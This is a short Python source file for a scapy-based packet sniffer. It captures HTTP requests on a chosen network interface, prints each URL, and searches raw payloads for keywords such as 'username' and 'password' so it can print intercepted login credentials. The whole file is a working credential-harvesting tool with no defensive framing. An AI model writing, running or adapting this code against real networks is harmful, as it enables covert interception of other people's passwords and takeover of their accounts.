import image
import version
import scapy.all as scapy
from scapy.layers import http


class My_sniffer:
    def __init__(self, interface):
        self.interface = interface

    def sniffer(self):
        scapy.sniff(iface=self.interface, store=False, prn=self.process_sniff_packet)

    def process_sniff_packet(self, packet):
        if packet.haslayer(http.HTTPRequest):
            #print(packet.show())
            url = self.url_packet(packet)
            print("\033[34mHTTP Request (URL)>>\033[0m   \033[31m{}\033[0m".format(url.decode('utf-8')))
            #print("HTTP Request (URL)>>   {}".format(url.decode('utf-8')))
            login_info = self.Raw_packet(packet)
            if login_info:
                print("\n\n\033[31m[+] Password and Login:\n{}\033[0m\n\n".format(login_info))

    def Raw_packet(self, packet):
        if packet.haslayer(scapy.Raw):
            print(packet[scapy.Raw].load)
            load = packet[scapy.Raw].load
            logins = ["user", "username", "pass", "password", "login"]
            for login in logins:
                if login in str(load):
                    return load

    def url_packet(self, packet):
        return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

    def run(self):
        print(image.image())
        print(version.version())
        self.sniffer()